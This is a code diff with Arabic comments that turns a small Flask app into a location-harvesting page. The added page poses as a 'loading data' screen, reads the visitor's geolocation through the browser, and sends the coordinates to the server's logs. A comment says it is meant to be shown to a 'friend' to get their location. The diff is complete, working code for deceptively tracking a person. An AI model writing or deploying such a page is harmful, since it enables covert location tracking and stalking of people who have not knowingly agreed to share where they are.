@@ -1,19 +1,38 @@
-from flask import Flask, request
+from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
+# هذه صفحة الويب التي ستظهر لصديقك وتطلب منه الموقع
+html_template = """
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>جارٍ تحميل البيانات...</h1>
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                // إرسال الإحداثيات إلى الخادم تلقائياً
+                window.location.href = "/?lat=" + lat + "&lon=" + lon;
+            });
+        }
+    </script>
+</body>
+</html>
+"""
+
 @app.route('/')
 def home():
-    # هذا السطر سيقرأ الإحداثيات من الرابط، مثلاً: ly01.onrender.com/?lat=24.0&lon=33.0
     lat = request.args.get('lat')
     lon = request.args.get('lon')
     
     if lat and lon:
-        # هنا يمكنك حفظ الإحداثيات في ملف نصي على الخادم أو إرسالها لنفسك
-        print(f"تم الحصول على إحداثيات جديدة: خط العرض {lat} وخط الطول {lon}")
-        return f"تم استلام الموقع: {lat}, {lon}"
+        # هنا ستصلك الإحداثيات في السجلات (Logs)
+        print(f"تم الحصول على الموقع: خط العرض {lat} وخط الطول {lon}")
+        return "تم استلام موقعك بنجاح!"
     else:
-        return "يرجى إرسال الإحداثيات عبر الرابط."
+        return render_template_string(html_template)
 
 if __name__ == "__main__":
     app.run()
